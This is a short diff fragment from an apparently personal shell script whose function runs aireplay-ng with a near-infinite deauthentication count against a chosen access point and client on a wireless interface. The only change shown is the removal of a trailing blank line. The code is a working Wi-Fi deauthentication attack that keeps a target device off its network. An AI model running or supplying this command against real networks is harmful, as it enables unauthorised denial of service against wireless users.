@@ -9,4 +9,3 @@ air(){
     aireplay-ng --deauth 1000000000000000000 -a $ma -c $tr $wi
 }
 air
-
